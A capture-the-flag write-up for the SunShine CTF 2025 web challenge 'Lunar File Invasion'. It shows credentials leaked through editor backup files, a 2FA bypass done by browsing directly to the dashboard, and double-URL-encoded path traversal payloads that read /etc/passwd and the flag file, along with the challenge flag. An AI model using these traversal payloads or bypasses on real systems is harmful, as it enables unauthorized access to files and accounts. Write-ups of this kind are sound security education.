# Lunar File Invasion — SunShine CTF 2025

> **Room / Challenge:** Lunar File Invasion (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** SunShine CTF 2025
- **Challenge:** Lunar File Invasion (web)
- **Target / URL:** `https://asteroid.sunshinectf.games`
- **Difficulty:** `Medium / Hard`
- **Points:** `463`
- **Date:** `30-09-2025`

---

## Goal

We have to get the flag by getting admin authentication and leveraging vulnerability.

## My Solution

There are no routes in the home page that we can visit normally.

![Guide image](../screenshots/lunar-file-invasion-1.png)

Visit `/robots.txt` we can see the content:

```
# don't need web scrapers scraping these sensitive files:

Disallow: /.gitignore_test
Disallow: /login
Disallow: /admin/dashboard
Disallow: /2FA
```

The website requires us to login through login form first, then pass 2FA in order to go to admin dashboard.

![Guide image](../screenshots/lunar-file-invasion-2.png)

Visit `/.gitignore_test`:

```
# this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
# this is because Muhammad noticed there were temporary files being stored on the disk when being edited
# something about EMACs.

# From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!

# static files are stored in the /static directory.
/index/static/login.html~
/index/static/index.html~
/index/static/error.html~
```

Access `/index/static/login.html~` and you can get credentials:

```javascript
<input value="admin@lunarfiles.muhammadali" type="text" name="email">
<input value="jEJ&(32)DMC<!*###" type="text" name="password">
```

Take this and login to the CMS, you will be redirected to 2FA page, however just simply go to `/admin/dashboard`, you will be redirected to `/admin/help`.

![Guide image](../screenshots/lunar-file-invasion-3.png)

Visit **Manage Files**, you can use `View` functionality to view secret files.

![Guide image](../screenshots/lunar-file-invasion-4.png)

It gives us hints to access to `/etc/passwd` file, this **View** functionality use route `/admin/download` to download files.

I tried several decoding and encoding with `../../` and `../../../`, also `%252E%252Fsecret1%252Etxt`.

You can try visit `https://asteroid.sunshinectf.games/admin/download/%252E%252Fsecret1%252Etxt` to download `secret1.txt` file.

After much more trial and reseaching, I achieve success downloading the `/etc/passwd` file through this payload:

```
%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252Fetc%252Fpasswd
```

`/etc/passwd` content:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
unprivileged:x:999:999::/home/unprivileged:/bin/bash
```

However, until now, I can still not get the flag and don't know where the flag is. I use ChatGPT to suggest me where the flag can locate at :)).

I tried to find `app.py` with several tests. I find the flag located at `./FLAG/flag.txt`.

```python
with open("./FLAG/flag.txt", "r") as f:
    FLAG = f.read()
```

Visit `/admin/download/%252E%252F%252E%252E%252F%252E%252F%252E%252E%252F%252E%252F%252E%252E%252FFLAG/flag.txt` to get the flag.

Flag is: `sun{lfi_blacklists_ar3_sOo0o_2O16_8373uhdjehdugyedy89eudioje}`
